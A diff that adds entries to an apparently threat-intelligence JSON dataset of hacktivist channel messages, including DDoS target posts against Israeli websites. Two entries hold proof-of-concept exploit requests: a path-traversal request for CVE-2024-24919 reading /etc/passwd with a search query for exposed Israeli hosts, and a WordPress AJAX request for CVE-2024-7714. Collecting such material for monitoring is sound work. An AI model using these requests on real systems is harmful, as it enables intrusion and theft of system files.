@@ -17561,6 +17561,92 @@
                 "nfire.digitalengage.us/index.html\n\n",
                 "ps://zone-xsec.com/search/q=fattah\n\n#"
             ]
+        },
+        {
+            "Message ID": 2241,
+            "Date": "2024-10-09",
+            "Content": "CVE-2024-24919\n\nPOST /clients/MyCRL HTTP/1.1\nHost: \nAccept-Encoding: gzip\n\naCSHELL/../../../../../../../etc/passwd\n\n\nfofa :  body=\"check point ssl network\" && country=\"IL\"\n\n#exploit #poc",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 2240,
+            "Date": "2024-10-09",
+            "Content": "cve-2024-7714\n\nGET /wp-admin/admin-ajax.php?ays_chatgpt_assistant_id=1&action=ays_chatgpt_admin_ajax&function=ays_chatgpt_disconnect\n\n#exploit #poc",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 2239,
+            "Date": "2024-10-09",
+            "Content": "",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 2238,
+            "Date": "2024-10-09",
+            "Content": "",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 2237,
+            "Date": "2024-10-09",
+            "Content": "🌐Target:\nhttps://www.eventer.co.il\n    Top 1 events website in israel \n💻Check host:\nhttps://check-host.net/check-report/1f223741k7bd\n\n#free_palestine",
+            "Attack Type": "Unknown",
+            "Location": [
+                "israel"
+            ],
+            "URLs": [
+                "ttps://www.eventer.co.il\n",
+                "tps://check-host.net/check-report/1f223741k7bd\n\n"
+            ]
+        },
+        {
+            "Message ID": 2236,
+            "Date": "2024-10-09",
+            "Content": "🔻 بالصورة \n\nالحشد الشعبي ينشر : تختلف الازمان ومرحب تحت اقدام علي",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 2235,
+            "Date": "2024-10-09",
+            "Content": "",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 2234,
+            "Date": "2024-10-09",
+            "Content": "🌐Target:\nhttps://www.greenrg.org.il\n  \n💻Check host:\n\nhttps://check-host.net/check-report/1f222797kfba\n\n#free_palestine",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "ttps://www.greenrg.org.il\n",
+                "tps://check-host.net/check-report/1f222797kfba\n\n"
+            ]
         }
     ],
     "Anonymous Chat": [
